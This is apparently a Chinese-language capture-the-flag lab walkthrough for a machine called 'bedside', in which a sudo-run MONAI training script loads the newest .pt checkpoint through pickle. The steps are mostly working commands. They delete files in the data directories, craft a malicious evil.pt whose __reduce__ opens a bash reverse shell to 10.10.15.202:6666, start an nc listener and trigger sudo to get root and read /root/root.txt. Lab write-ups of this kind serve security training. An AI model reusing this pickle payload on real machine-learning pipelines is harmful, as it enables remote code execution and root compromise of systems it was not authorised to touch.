这个脚本最关键的风险点不在训练逻辑，而在 **checkpoint 加载**：

```shell
from monai.handlers import CheckpointLoader

# 查找最新的 .pt 文件
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)  # /datastore/checkpoints/*.pt

if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)  # ← 这里触发 torch.load() → pickle.load()
```

`find_latest_checkpoint()` 会从 `/datastore/checkpoints` 里找最新的 `.pt` 文件，然后交给 MONAI 的 `CheckpointLoader` 加载。
MONAI / PyTorch 的 `.pt` 本质是 pickle 序列化文件，加载不可信 checkpoint 时可能触发 **反序列化任意代码执行**。

所以如果满足下面条件，就可能提权：

1. `developer` 能写 `/datastore/checkpoints`
2. 训练脚本被 root 执行，或者由 systemd/cron 定时以 root 运行
3. `torch.load` 没有启用 `weights_only=True` 这类保护

CheckpointLoader 内部调用 torch.load()而torch.load(使用 pickle.load()反序列化.pt文件。

第 1 步：确认 tun0 IP

在**攻击机**上执行：

```bash
ifconfig tun0
```

记下 `inet` 后面的地址，下面用 `<TUN0_IP>` 代替。

第 2 步：清空 processed，放入有效 PNG

在 `datawrangler` 容器中，**逐行手动输入**（不要从网页复制）：

```bash
find /datastore/processed -maxdepth 1 -type f -delete
```

```bash
find /datastore/staging -maxdepth 1 -name '*.txt' -delete
```

生成 1x1 有效 PNG 到 `processed`：

```bash
python3 -c "import struct,zlib;w,h=1,1;raw=b'\x00'+b'\xff\x00\x00'*w;comp=zlib.compress(raw);ch=lambda t,d:struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff);png=b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',comp)+ch(b'IEND',b'');open('/datastore/processed/test.png','wb').write(png)"
```

确认

```bash
ls -la /datastore/processed/
```

应该只有 `test.png`。

第 3 步：生成恶意 evil.pt

**把 `<TUN0_IP>` 和 `6666` 换成你自己的。**

```bash
python3 -c "import pickle,os;exec('class Evil:\n    def __reduce__(self):\n        return (os.system, (\'bash -c \"bash -i >& /dev/tcp/10.10.15.202/6666 0>&1\"\',))');open('/datastore/checkpoints/evil.pt','wb').write(pickle.dumps(Evil()))"
```

如果上面这一行太复杂容易输错，用 heredoc 手动输入：

bash

```bash
cat > /tmp/e.py <<'PYEOF'
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.10.15.202/6666 0>&1"',))
open('/datastore/checkpoints/evil.pt', 'wb').write(pickle.dumps(Evil()))
PYEOF
python3 /tmp/e.py
```

确保它是 mtime 最新的 `.pt`：

```bash
touch /datastore/checkpoints/evil.pt
ls -la /datastore/checkpoints/
```

应该只有 `evil.pt`。

第 4 步：攻击机启动监听

在攻击机上：

```bash
rlwrap nc -lvnp 6666
```

保持监听不要关。

第 5 步：宿主机触发 sudo

回到 `developer@bedside` 终端：

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**不能加任何参数**，sudo 规则是精确匹配。

第 6 步：获取 root shell

监听端收到连接后：

```bash
id
cat /root/root.txt
```

![image-20260913214149904](/images/prolabs/bedside/20260913214149952.png)
